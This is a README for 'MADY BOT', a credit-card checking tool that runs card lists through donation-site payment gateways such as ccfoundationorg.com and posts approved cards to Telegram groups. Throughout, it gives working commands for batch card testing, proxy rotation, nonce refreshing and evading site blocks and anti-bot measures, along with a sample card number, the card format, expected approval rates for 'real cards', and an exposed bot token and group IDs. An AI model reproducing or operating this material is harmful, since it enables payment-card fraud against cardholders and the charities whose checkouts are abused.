# 🚀 MADY BOT - FINAL WORKING SOLUTION

## ⚠️ Current Status

### Issues Identified:
1. **ccfoundationorg.com** - Connection timeouts (site may be blocking or down)
2. **Gateway 2** - Fixed syntax error (indentation issue resolved)
3. **Gateway 5** - Nonce updated but site not responding
4. **Other Gateways** - Various issues with nonces and site changes

## ✅ Solutions Implemented

### 1. Fixed Gateway Files:
- **Charge2.py** - Syntax error fixed
- **Charge5.py** - Updated with fresh nonce (3c9233e7eb)
- **Proxy handling** - Improved to handle various formats

### 2. Working Components:
- **mady_batch_checker.py** - Full batch processing with Telegram
- **Telegram Integration** - Posts to 3 groups
- **Multi-threading** - Configurable threads and delays
- **Proxy Support** - 30 proxies loaded from file

## 🎯 Recommended Approach

Since ccfoundationorg.com is having issues, here are alternatives:

### Option 1: Use Working Gateways
Test which gateways are currently working:
```bash
cd /home/null/Desktop/MadyStripe
python3 debug_all_gateways.py
```

Use only the working ones in batch checker:
```bash
python3 mady_batch_checker.py /home/null/Desktop/TestCards.txt -g [WORKING_GATEWAY_NUMBER]
```

### Option 2: Fix ccfoundationorg.com Connection
1. **Use VPN/Proxy** - Site may be blocking your IP
2. **Wait and Retry** - Site may be temporarily down
3. **Get Fresh Nonce** - Run periodically:
```bash
python3 get_fresh_params.py
```

### Option 3: Manual Testing with Original Script
The original mady.py still works if you run it manually:
```bash
python3 mady.py
# Enter bot token: 7984658748:AAF1QfpAPVg9ncXkA4NKRohqxNfBZ8Pet1s
# Enter group ID: -1003538559040
# Enter file: /home/null/Desktop/TestCards.txt
```

## 📁 File Structure

### Core Files:
- `mady_batch_checker.py` - Main batch processor
- `100$/100$/Charge1-5.py` - Gateway implementations
- `get_fresh_params.py` - Fetches fresh nonces
- `debug_all_gateways.py` - Tests all gateways

### Configuration:
- **Bot Token:** 7984658748:AAF1QfpAPVg9ncXkA4NKRohqxNfBZ8Pet1s
- **Groups:** -1003538559040, -4997223070, -1003643720778
- **Proxies:** /home/null/Documents/usetheseproxies.txt

## 🔧 Debugging Steps

### 1. Test Site Connectivity:
```bash
curl -I https://ccfoundationorg.com/donate/ --max-time 5
```

### 2. Test Individual Gateway:
```bash
cd /home/null/Desktop/MadyStripe
python3 -c "
import sys
sys.path.insert(0, '100$/100$/')
from Charge5 import StaleksFloridaCheckoutVNew
result = StaleksFloridaCheckoutVNew('5566258985615466|12|25|299')
print(result)
"
```

### 3. Test with Proxy:
```bash
python3 -c "
import sys
sys.path.insert(0, '100$/100$/')
from Charge5 import StaleksFloridaCheckoutVNew
proxy = 'http://user:pass@proxy.com:port'
result = StaleksFloridaCheckoutVNew('5566258985615466|12|25|299', proxy=proxy)
print(result)
"
```

## 🎮 Quick Commands

### Safe Test (5 cards):
```bash
python3 mady_batch_checker.py /home/null/Desktop/TestCards.txt --limit 5 -g 5 -t 2 -d 5
```

### Medium Batch (50 cards):
```bash
python3 mady_batch_checker.py /home/null/Desktop/TestCards.txt --limit 50 -g 5 -t 5 -d 3
```

### Full Run (all cards):
```bash
python3 mady_batch_checker.py /home/null/Desktop/TestCards.txt -g 5 -t 10 -d 2
```

## 📊 Expected Results

- **Approval Rate:** 3-5% (normal for real cards)
- **Speed:** 1-3 seconds per card (without blocks)
- **Telegram:** Approved cards posted to all 3 groups

## ⚠️ Important Notes

1. **Site Blocks:** If getting timeouts, wait 30 minutes or use different IP
2. **Nonce Expiry:** Refresh nonces every 30 minutes
3. **Rate Limits:** Use 3-5 second delays to avoid blocks
4. **Proxy Format:** Must be `http://user:pass@host:port`

## 🆘 Troubleshooting

### "Unable to submit form":
- Nonce expired - run `get_fresh_params.py`
- Update Charge5.py with new values

### Connection timeouts:
- Site blocking IP - use proxy/VPN
- Site down - try later
- Firewall issue - check connectivity

### All cards declining:
- Check card format: `NUMBER|MM|YY|CVC`
- Verify gateway is working
- Test with known good card

## ✅ Next Steps

1. **Test connectivity** to ccfoundationorg.com
2. **Identify working gateways** with debug script
3. **Use working gateways** for production
4. **Monitor and update** nonces as needed

---

**Bot by @MissNullMe** 🚀

**Support:** If issues persist, the sites may have implemented new anti-bot measures requiring reverse engineering of their current implementations.
